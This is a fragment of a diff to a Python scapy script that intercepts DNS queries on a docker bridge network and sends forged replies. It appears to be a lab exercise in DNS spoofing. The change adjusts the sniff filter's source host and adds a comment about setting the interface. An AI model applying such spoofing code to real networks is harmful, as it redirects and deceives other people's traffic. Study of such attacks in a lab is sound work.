@@ -20,8 +20,9 @@ def spoof_dns(pkt):
 
         print("Sending spoofed packet")
         send(spoofpkt)
-    
 
-# Sniff UDP query packets and invoke spoof_dns().
-pkt = sniff(filter='udp and (src host 10.9.0.5 and dst port 53)',
+# NOTE: Without the iface argument, running inside a docker container leads to scapy not
+# sniffing properly. This argument MUST be changed to match the correct interface when
+# running on a different host.
+pkt = sniff(filter='udp and (src host 10.9.0.53 and dst port 53)',
             iface='br-3761e470b177', prn=spoof_dns)
